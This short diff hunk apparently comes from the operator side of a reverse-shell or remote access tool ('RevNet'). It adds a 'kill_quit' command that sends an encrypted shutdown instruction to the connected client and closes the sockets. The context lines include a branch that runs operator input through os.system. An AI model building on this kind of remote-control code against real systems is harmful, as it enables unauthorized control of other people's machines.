@@ -103,6 +103,18 @@ def passcmd():
 
             sys.exit()
 
+        elif cmd=="kill_quit":
+
+            RevNet.send_all(c,str.encode(RevNet.enc(cmd)))
+
+            time.sleep(10)
+
+            c.close()
+
+            s.close()
+
+            sys.exit()
+
         elif cmd[:5]=="lexec":
 
             os.system(cmd[6:])
